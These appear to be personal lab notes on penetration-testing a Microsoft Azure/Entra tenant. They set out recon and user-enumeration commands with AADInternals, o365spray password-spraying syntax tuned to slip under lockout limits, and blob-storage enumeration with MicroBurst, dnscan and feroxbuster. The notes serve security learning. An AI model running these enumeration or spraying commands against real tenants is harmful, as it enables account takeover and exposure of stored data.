@@ -1,1 +1,197 @@
-Azure pen testing:
+Cloud Azure pen testing:
+
+
+
+admin.microsoft.com
+	Billing -> Your Products -> Recurring billing -> 
+
+portal.azure.com
+	in search bar -> microsoft entra id
+		expand Manage -> Licenses -> All Products -> should see MS 365 Business Premium
+
+		Users -> Select my Account -> click Per-user MFA -> Select me -> Enable MFA
+
+	in search bar -> subscriptions 
+		Click Azure subscription 1 
+
+login.microsoftonline.com
+
+
+Microsoft Entra ID -> Cloud based Identity and Access Management Service (Authentication and Authorization)
+	Enables you to access external resources, cloud and on-premise apps:
+		Oracle
+		SAP
+		Box
+		Cloud Apps / Outlook, etc
+		Salesforce
+
+Azure has 2 types of roles:
+	Microsoft Entra roles (configured in the Microsoft Entra tenant oversee entire cloud environment)	
+		Global Admin -> highest level role that can do anything
+		Application Admin
+		Application Developer
+		Billing Admin
+	Azure roles (Can interact with the resources created and are scoped to specific resources)
+		Owner
+		Contributor
+		Reader
+		User Access Admin
+
+
+		
+
+Requires PowserShell 7
+https://learn.microsoft.com/en-us/powershell/scripting/install/installing-powershell-on-windows?view=powershell-7.5#msi
+	create desktop shortcut to c:\program files\powershell\7\pwsh.exe
+
+Install Azure PowerShell Module (Run as administrator):
+	Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
+	Set-PSRepository -Name PSGallery -InstallationPolicy Trusted
+	Install-Module -Name Az -Repository PSGallery -Force
+	Invoke-WebRequest -Uri https://aka.ms/installazurecliwindows -OutFile .\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; rm .\AzureCLI.msi
+
+	add C:\Program Files (x86)\Microsoft SDKs\Azure\CLI2\wbin to path
+
+
+
+Domain: noacompany715.onmicrosoft.com
+
+
+
+AAD Internals -> PowerShell module for administering Azure AD 
+	Installation:
+		Install-Module AADinternals
+		Import-Module AADInternals
+
+	Return Tenant ID:
+		Get-AADIntTenantID -Domain noacompany715.onmicrosoft.com
+
+	Return all domains from the tenant
+		Get-AADIntTenantDomains -Domain noacompany715.onmicrosoft.com
+
+	OpenID:
+		Get-AADIntOpenIDConfiguration -Domain noacompany715.onmicrosoft.com
+			Note tenant_region_scope (NA, EU, etc)
+		
+	Invoke-AADIntReconAsOutsider -DomainName noacompany715.onmicrosoft.com | Format-Table
+		Is DesktopSSO enabled?
+			if so, users do not need to enter Microsoft Entra ID credentials when using their 
+			corporate desktops. 
+
+		DNS - Does the DNS record exists?
+		MX - https://learn.microsoft.com/en-us/microsoft-365/enterprise/external-domain-name-system-records?#external-dns-records-required-for-email-in-office-365-exchange-online 
+			Does the MX point to Office 365? 
+		SPF - https://learn.microsoft.com/en-us/microsoft-365/enterprise/external-domain-name-system-records?#external-dns-records-required-for-email-in-office-365-exchange-online 			Does the SPF contain Exchange Online? 
+		DMARC - https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/email-authentication-dmarc-configure 
+			Is the DMARC record configured? 
+		DKIM - https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/email-authentication-dkim-configure 
+			Is the DKIM record configured? 
+		MTA-STS - https://techcommunity.microsoft.com/t5/exchange-team-blog/introducing-mta-sts-for-exchange-online/ba-p/3106386 
+			Is the MTA-STS recored configured? 
+		Type - https://learn.microsoft.com/en-us/microsoft-365/enterprise/deploy-identity-solution-identity-model?#authentication-for-hybrid-identity 
+			Federated or Managed?
+		STS - The FQDN of the federated IdP’s (Identity Provider) STS (Security Token Service) server 
+		RPS - https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/operations/create-a-relying-party-trust 
+			Relaying parties of STS (AD FS). Requires -GetRelayingParties switch. 
+
+
+
+
+	User Enumeration:
+		Invoke-AADIntUserEnumerationAsOutsider -UserName "winnie@noacompany715.onmicrosoft.com", "bagel@noacopany715.microsoft.com" -method Login
+			methods include:	Normal		Uses GetCredentialType endpoint to query user information
+						Login		Tries to log in to Entra ID using oauth2 endpoint
+						AutoLogon	Tries to log in to Entra ID using autologon (SSO) endpoint (attempts are not logged)
+						RST2		Tries to log in to Entra ID using RST2 endpoint (attempts are not logged
+				method appears to be optional
+
+		Get-Content .\users.txt | Invoke-AADIntUserEnumerationAsOutsider 
+
+
+
+Password Spraying:
+	https://github.com/0xZDH/o365spray.git
+
+	By default, Azure sets lockout threshold at 10 attempts and lockout duration is 60 seconds
+
+	Run on Kali Linux
+	Installation:
+		virtualenv o365spray
+		cd o365spray
+		git clone https://github.com/0xZDH/o365spray.git
+		python3 -m pip install -r requirements.txt 
+
+	Usage:
+		python3 o365spray.py --spray -U users.txt -P pass.txt -c 9 -l 1 --domain noacompany715.onmicrosoft.com
+			--spray		-> password spray attack
+			-U users.txt	-> file containing user accounts
+			-P pass.txt	-> password file
+			-c 9		-> count 9 -> number of pw attempts to run per user before resetting the lockout account timer	
+			-l 1		-> lockout 1 -> lockout policy's reset time (in minutes)
+
+
+
+
+Evilginx2
+
+GraphSpy -> Swiss Army Knife for Attacking M365 & Entra
+
+Cloud Storage Hunting:
+	An Azure storage account contains all of your Azure Storage data objects:
+		blobs -> cloud object storage service. Designed to store unstructured data (images, videos, documents and backups)
+		files
+		queues
+		tables
+
+		each storage account is available over HTTPS:
+			Blob storage:			https://<storage-accounts>.blob.core.windows.net
+			Static website (blob storage):	https://<storage-accounts>.web.core.windows.net
+			Data Lake Storage Gen2:		https://<storage-accounts>.dfs.core.windows.net
+			Azure Files:			https://<storage-accounts>.file.core.windows.net
+			Queue Storage:			https://<storage-accounts>.queue.core.windows.net
+			Tables Storage:			https://<storage-accounts>.table.core.windows.net
+
+
+	MicroBurst -> a powershell toolkit for Attacking Azure (finding blobs)
+		https://github.com/NetSPI/MicroBurst
+		
+		Install prereqs
+			Get-Module -Name AzureRM 
+			Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
+			Install-Module -Name Az -Repository PSGallery -Force
+			Install-Module -Name AzureAd -Repository PSGallery -Force
+			Install-Module -Name MSOnline -Repository PSGallery -Force
+
+		Set-ExecutionPolicy -Scope Process -ExectutionPolicy Bypass	
+		import-module ./MicroBurst.psm1		#takes a while to load
+		Invoke-EnumerateAzureBlobs -base blah -Permutations ".\misc\permutations.txt"
+			Found Storage Account - blah.blob.core.windows.net
+			Found Storage Account - blahstorage.blob.core.windows.net
+			Found Storage Account - blahtest.blob.core.windows.net
+
+		In browser:
+			https://blah.blob.core.windows.net/public?restype=container&comp=list
+				if "public" was discovered in the Invoke-EnumerateAzureBlobs command 
+
+
+	DNSCAN -> python script to do the same as MicroBurst:
+		git clone https://github.com/rbsec/dnscan.get
+		cd dnscan
+		python3 ./dnscan.py -d blob.core.windows.net -w custom-domains-list.txt
+
+	feroxbuster -> another tool
+		https://github.com/epi052/feroxbuster
+		apt install feroxbuster
+		feroxbuster --url blah.blob.core.windows.net/public -w ./wordlist.txt
+			"public" is the container name
+			this will discover files in that container
+
+
+
+
+
+
+
+
+
+
